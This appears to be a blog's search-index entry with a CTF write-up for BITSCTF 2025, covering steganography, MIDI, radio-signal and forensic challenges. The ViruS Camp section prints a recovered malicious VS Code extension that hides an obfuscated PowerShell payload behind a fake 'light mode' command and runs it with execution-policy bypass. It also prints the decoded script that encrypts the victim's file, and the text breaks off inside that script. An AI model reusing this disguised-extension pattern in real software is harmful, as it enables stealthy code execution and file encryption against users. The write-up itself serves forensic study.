<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BITSCTF-2025</title>
      <link href="/2025/02/09/BITSCTF-2025/"/>
      <url>/2025/02/09/BITSCTF-2025/</url>
      
        <content type="html"><![CDATA[<p>I participated in BITSCTF 2025, organized by Bitskrieg. Here are the Writeups of some Forensics, RF and DFIR challenges I was personally able to solve during the competition.</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Finders-Keepers"><a href="#Finders-Keepers" class="headerlink" title="Finders Keepers"></a>Finders Keepers</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Another simple steganography challenge where we are initially given a .png file.</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>The given png has a .jpeg and a .wav file embedded in itself which we can find by the hex analysis and then extract the file using byte scraping to get the following two files.</p><p><a href="/./files/extracted_at_0x12005.jpg">Image</a><br><a href="/./files/extracted_at_0x645f0.wav">Audio</a></p><p>The audio file on opening in audacity immediately shows the profile of a morse code so we use this online tool (<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a>) to decode the morse code and get its message as <code>snooooooppppppp</code>, which happens to be the steghide passphrase for the extracted jpeg file and it gives us our flag.</p><p><img src="/./images/audacity.png" alt="Audacity"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;1_4m_5l33py_1256AE76&#125;</span></span><br></pre></td></tr></table></figure><h3 id="AutoBots-Unite"><a href="#AutoBots-Unite" class="headerlink" title="AutoBots Unite!"></a>AutoBots Unite!</h3><h4 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a chall.dwg file with following description: “Mr. Douglas Adams is so sick and tired of old people using the same encryption methods again and again.”</p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>Inital searches reveal that a .dwg file is a 2D or 3D drawing created with Autodesk AutoCAD so we can open the file in AutoDesk Online here (<a href="https://viewer.autodesk.com/designviews">https://viewer.autodesk.com/designviews</a>). On opening the file here we get a really absurd looking image of some sort of barcode.</p><p><img src="/./images/chall.dwg.png" alt="Chall.dwg"></p><p>Initially I tried various different approaches of finding some differences in the lines color shades or the inter-line distances but at the end it turned out that the flag was embedded in the lengths of the lines. All lines had lengths of type 42.xxx or 43.xxx so if we do <code>round((length-42)*100)</code> we get ASCII codes which on decoding initially gives some garbish but eventually reveals our flag.</p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;b4rc0d3s_4r3_0v3r4t3d_4sf_h3h3_0k1md0n3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Symphonies"><a href="#Symphonies" class="headerlink" title="Symphonies"></a>Symphonies</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are presented with a midi file (though corrupted) and our target is to decode its message.</p><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>Inital searches reveal that a .midi file varies from MP3 or WAV files as it is not a waveform. This means that it inherently produces no audio signal. MIDI files contain messages that communicate to software instruments (or connected hardware gear) what to play. These messages include:</p><pre><code>Note-on/off: Note on signifies the start of a specific keyboard note; note-off signifies the end of a note.Velocity value: High values lead to a louder volume for that note as well as possible articulation differences; low values lead to lower volumes for the note.Pitch bend: Controls pitch alterations up or down a semitone (often linked to pitch bend wheels).</code></pre><p><img src="/./images/midi_hex.png" alt="Original Hex"></p><p>Initially the magic bytes of the given file are corrupted which we can quickly fix to the correct bytes <code>4D 54 68 64</code> to fix the .midi file which we can now load in (<a href="https://signal.vercel.app/edit">https://signal.vercel.app/edit</a>) for its visualisation.</p><p><img src="/./images/midi.png" alt="Midi file"></p><p>Immediately what catches our eye is all the velocities lie below 127 so these may represent an ASCII code so we write the following code to get and decode both the file’s velocites and the notes which then because are 2 strings of similar lengths we try to XOR them as our first option and that just happends to be the correct solution to get our flag.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mido</span><br><span class="line"></span><br><span class="line">midi = mido.MidiFile(<span class="string">&#x27;Demo2.midi&#x27;</span>)</span><br><span class="line">velocities = <span class="string">&#x27;&#x27;</span></span><br><span class="line">notes=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> midi:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> msg.is_meta <span class="keyword">and</span> msg.<span class="built_in">type</span> == <span class="string">&#x27;note_on&#x27;</span>:</span><br><span class="line">        velocities = velocities + <span class="built_in">chr</span>(msg.velocity)</span><br><span class="line">        notes = notes + <span class="built_in">chr</span>(msg.note)</span><br><span class="line"></span><br><span class="line">notes = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,notes.split()))</span><br><span class="line">notes = notes[:<span class="built_in">len</span>(velocities)]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(a ^ <span class="built_in">ord</span>(b)) <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(notes, velocities))</span><br><span class="line"><span class="built_in">print</span>(result.encode())</span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;y0u_7h0u6h7_y0u_c0uld_6u355_7h15?!_qrtd434&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Hardware-RF"><a href="#Hardware-RF" class="headerlink" title="Hardware&#x2F;RF"></a>Hardware&#x2F;RF</h2><h3 id="ulation"><a href="#ulation" class="headerlink" title="%ulation"></a>%ulation</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a complex signal file in this challenge and the name obviously hint to some sort of modulation of the signal is involved.</p><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>Fairly straight forward challenge where all we had to do was open the file in Universal Radio Hacker (<a href="https://github.com/jopohl/urh">https://github.com/jopohl/urh</a>) and it does all the job for us and immediately spit out the flag.</p><p><img src="/./images/modulation_urh.png" alt="Given Signal"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;A_br13f_4nd_g3ntl3_1ntr0duc710n_70_r4di0_h4ck1ng_c5c33558&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Old-Skool"><a href="#Old-Skool" class="headerlink" title="Old Skool"></a>Old Skool</h3><h4 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a .iq file with the following description:<br>“I remember my father talking about those old age radios and how they work. Pretty cool if you ask me. Also he told me about a radio channel which had a frequency between 1500-1599khz from PHILIPPINES.</p><p>Note: Sampling Rate for the file is 24kHz”</p><h4 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h4><p>We are given a .iq file, which are standard RF signal files wherein the Sampling rate of given file being 24 khz and the freq range of the radio channel used to transmit being of range 1500-1599 kHz immediately tells its a challenge of Frequency Modulation or downsampling. Now being an ECE student I decided to do signal analysis using MATLAB just to be old school and justify the challenge name.</p><p>The process I followed was to first read the iq and interpret it as complex signals that they are <code>I+jQ</code> where I is the In-phase component and Q is the Quadrature-phase component. Then perform signal mixing to make it baseband and remove the DC components. Finally add a band-pass (butterworth) filter on top.</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">clc; clear; close all;</span><br><span class="line">filename = <span class="string">&#x27;\modulated.iq&#x27;</span>;</span><br><span class="line">fs = <span class="number">24000</span>;</span><br><span class="line"></span><br><span class="line">fid = fopen(filename, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">raw_data = fread(fid, <span class="string">&#x27;float32&#x27;</span>); </span><br><span class="line"></span><br><span class="line">iq_data = <span class="built_in">complex</span>(raw_data(<span class="number">1</span>:<span class="number">2</span>:<span class="keyword">end</span>), raw_data(<span class="number">2</span>:<span class="number">2</span>:<span class="keyword">end</span>));</span><br><span class="line">t = (<span class="number">0</span>:<span class="built_in">length</span>(iq_data)<span class="number">-1</span>) / fs;</span><br><span class="line">f_station = <span class="number">1566000</span>;</span><br><span class="line">shifted_signal = iq_data .* <span class="built_in">exp</span>(<span class="number">-1</span><span class="built_in">j</span> * <span class="number">2</span> * <span class="built_in">pi</span> * f_station * t.&#x27;);</span><br><span class="line"></span><br><span class="line">am_signal = <span class="built_in">abs</span>(shifted_signal);</span><br><span class="line">am_signal = am_signal - <span class="built_in">mean</span>(am_signal);</span><br><span class="line">am_signal = am_signal / <span class="built_in">max</span>(<span class="built_in">abs</span>(am_signal));</span><br><span class="line"></span><br><span class="line">fc = <span class="number">5000</span>;</span><br><span class="line">[b, a] = butter(<span class="number">5</span>, fc/(fs/<span class="number">2</span>));</span><br><span class="line">filtered_audio = filter(b, a, am_signal);</span><br><span class="line"></span><br><span class="line">audiowrite(<span class="string">&#x27;radio_audio.wav&#x27;</span>, filtered_audio, fs);</span><br><span class="line">sound(filtered_audio, fs);</span><br></pre></td></tr></table></figure><p><a href="/./files/radio_audio.wav">Extracted Audio</a></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;welcome_to_our_radio_enjoy_our_song_collection&#125;</span></span><br></pre></td></tr></table></figure><h2 id="DFIR"><a href="#DFIR" class="headerlink" title="DFIR"></a>DFIR</h2><h3 id="ViruS-Camp-1"><a href="#ViruS-Camp-1" class="headerlink" title="ViruS Camp 1"></a>ViruS Camp 1</h3><h4 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given an artifact file dimp.ad1 and the description says to decode the encrypted flag file.</p><h4 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h4><p>On initial analysis of the given artifacts file in FTK Imager we find a peculiar file <code>extension.js</code> which appears to be the malware in question responsible for flag encryption. So the challenge was basically around a malicious extension of VS-Code which encrypted the user’s flag image which was to be decoded. Given below is the <code>extension.js</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> __createBinding = (<span class="variable language_">this</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">__createBinding</span>) || (<span class="title class_">Object</span>.<span class="property">create</span> ? (<span class="keyword">function</span>(<span class="params">o, m, k, k2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (k2 === <span class="literal">undefined</span>) k2 = k;</span><br><span class="line">    <span class="keyword">var</span> desc = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(m, k);</span><br><span class="line">    <span class="keyword">if</span> (!desc || (<span class="string">&quot;get&quot;</span> <span class="keyword">in</span> desc ? !m.<span class="property">__esModule</span> : desc.<span class="property">writable</span> || desc.<span class="property">configurable</span>)) &#123;</span><br><span class="line">      desc = &#123; <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> m[k]; &#125; &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(o, k2, desc);</span><br><span class="line">&#125;) : (<span class="keyword">function</span>(<span class="params">o, m, k, k2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (k2 === <span class="literal">undefined</span>) k2 = k;</span><br><span class="line">    o[k2] = m[k];</span><br><span class="line">&#125;));</span><br><span class="line"><span class="keyword">var</span> __setModuleDefault = (<span class="variable language_">this</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">__setModuleDefault</span>) || (<span class="title class_">Object</span>.<span class="property">create</span> ? (<span class="keyword">function</span>(<span class="params">o, v</span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(o, <span class="string">&quot;default&quot;</span>, &#123; <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="attr">value</span>: v &#125;);</span><br><span class="line">&#125;) : <span class="keyword">function</span>(<span class="params">o, v</span>) &#123;</span><br><span class="line">    o[<span class="string">&quot;default&quot;</span>] = v;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> __importStar = (<span class="variable language_">this</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">__importStar</span>) || (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ownKeys = <span class="keyword">function</span>(<span class="params">o</span>) &#123;</span><br><span class="line">        ownKeys = <span class="title class_">Object</span>.<span class="property">getOwnPropertyNames</span> || <span class="keyword">function</span> (<span class="params">o</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> ar = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> o) <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(o, k)) ar[ar.<span class="property">length</span>] = k;</span><br><span class="line">            <span class="keyword">return</span> ar;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">ownKeys</span>(o);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">mod</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mod &amp;&amp; mod.<span class="property">__esModule</span>) <span class="keyword">return</span> mod;</span><br><span class="line">        <span class="keyword">var</span> result = &#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (mod != <span class="literal">null</span>) <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="title function_">ownKeys</span>(mod), i = <span class="number">0</span>; i &lt; k.<span class="property">length</span>; i++) <span class="keyword">if</span> (k[i] !== <span class="string">&quot;default&quot;</span>) <span class="title function_">__createBinding</span>(result, mod, k[i]);</span><br><span class="line">        <span class="title function_">__setModuleDefault</span>(result, mod);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="built_in">exports</span>, <span class="string">&quot;__esModule&quot;</span>, &#123; <span class="attr">value</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">activate</span> = activate;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">deactivate</span> = deactivate;</span><br><span class="line"><span class="keyword">const</span> vscode = <span class="title function_">__importStar</span>(<span class="built_in">require</span>(<span class="string">&quot;vscode&quot;</span>));</span><br><span class="line"><span class="keyword">const</span> child_process_1 = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="title function_">__importStar</span>(<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>));</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">activate</span>(<span class="params">context</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> command = vscode.<span class="property">commands</span>.<span class="title function_">registerCommand</span>(<span class="string">&quot;rs&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> scriptContent = <span class="string">`$wy7qIGPnm36HpvjrL2TMUaRbz = &quot;K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ&quot; ;</span></span><br><span class="line"><span class="string">$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2&gt;&amp;1&gt; $null ;</span></span><br><span class="line"><span class="string">$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng(&quot;$9U5RgiwHSYtbsoLuD3Vf6&quot;)) ;</span></span><br><span class="line"><span class="string">$9ozWfHXdm8eIBYru = &quot;InV&quot;+&quot;okE&quot;+&quot;-ex&quot;+&quot;prE&quot;+&quot;SsI&quot;+&quot;ON&quot; ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;`</span>;</span><br><span class="line">        <span class="keyword">const</span> scriptPath = <span class="string">`C:\\Users\\vboxuser\\AppData\\Local\\Temp\\temp0001`</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fs.<span class="title function_">writeFileSync</span>(scriptPath, scriptContent);</span><br><span class="line">            vscode.<span class="property">window</span>.<span class="title function_">showInformationMessage</span>(<span class="string">`The light mode will activate in a few minutes.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            vscode.<span class="property">window</span>.<span class="title function_">showErrorMessage</span>(<span class="string">`Error activating light mode.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        (<span class="number">0</span>, child_process_1.<span class="property">exec</span>)(<span class="string">`powershell.exe -ExecutionPolicy Bypass -File &quot;<span class="subst">$&#123;scriptPath&#125;</span>&quot;`</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    context.<span class="property">subscriptions</span>.<span class="title function_">push</span>(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deactivate</span>(<span class="params"></span>) &#123; &#125;</span><br><span class="line"><span class="comment">//# sourceMappingURL=extension.js.map</span></span><br></pre></td></tr></table></figure><p>The first flag was fairly staright forward it was just b64 encoded and commented in the end of the above code so we got out first flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">The 1st flag is: BITSCTF&#123;H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c&#125;</span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ViruS-Camp-2"><a href="#ViruS-Camp-2" class="headerlink" title="ViruS Camp 2"></a>ViruS Camp 2</h3><h4 id="Challenge-Description-6"><a href="#Challenge-Description-6" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Follow up to the first challenge wherein now we need to decode the encryption methodology and decode the flag.enc we get from the same .ad1 file.</p><h4 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h4><p>On simple deobfuscation of the extension we get that it executed the following powershell script for the encryption.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="string">&quot;MyS3cr3tP4ssw0rd&quot;</span></span><br><span class="line"><span class="variable">$salt</span> = [<span class="built_in">Byte</span>[]](<span class="number">0</span>x01,<span class="number">0</span>x02,<span class="number">0</span>x03,<span class="number">0</span>x04,<span class="number">0</span>x05,<span class="number">0</span>x06,<span class="number">0</span>x07,<span class="number">0</span>x08)</span><br><span class="line"><span class="variable">$iterations</span> = <span class="number">10000</span></span><br><span class="line"><span class="variable">$keySize</span> = <span class="number">32</span>   </span><br><span class="line"><span class="variable">$ivSize</span> = <span class="number">16</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$deriveBytes</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.Rfc2898DeriveBytes(<span class="variable">$password</span>, <span class="variable">$salt</span>, <span class="variable">$iterations</span>)</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$deriveBytes</span>.GetBytes(<span class="variable">$keySize</span>)</span><br><span class="line"><span class="variable">$iv</span> = <span class="variable">$deriveBytes</span>.GetBytes(<span class="variable">$ivSize</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$inputFile</span> = <span class="string">&quot;C:\\Users\\vboxuser\\Desktop\\flag.png&quot;</span></span><br><span class="line"><span class="variable">$outputFile</span> = <span class="string">&quot;C:\\Users\\vboxuser\\Desktop\\flag.enc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$aes</span> = [<span class="type">System.Security.Cryptography.Aes</span>]::Create()</span><br><span class="line"><span class="variable">$aes</span>.Key = <span class="variable">$key</span></span><br><span class="line"><span class="variable">$aes</span>.IV = <span class="variable">$iv</span></span><br><span class="line"><span class="variable">$aes</span>.Mode = [<span class="type">System.Security.Cryptography.CipherMode</span>]::CBC</span><br><span class="line"><span class="variable">$aes</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::PKCS7</span><br><span class="line"></span><br><span class="line"><span class="variable">$encryptor</span> = <span class="variable">$aes</span>.CreateEncryptor()</span><br><span class="line"></span><br><span class="line"><span class="variable">$plainBytes</span> = [<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="variable">$inputFile</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$outStream</span> = <span class="built_in">New-Object</span> System.IO.FileStream(<span class="variable">$outputFile</span>, [<span class="type">System.IO.FileMode</span>]::Create)</span><br><span class="line"><span class="variable">$cryptoStream</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.CryptoStream(<span class="variable">$outStream</span>, <span class="variable">$encryptor</span>, [<span class="type">System.Security.Cryptography.CryptoStreamMode</span>]::<span class="built_in">Write</span>)</span><br><span class="line"></span><br><span 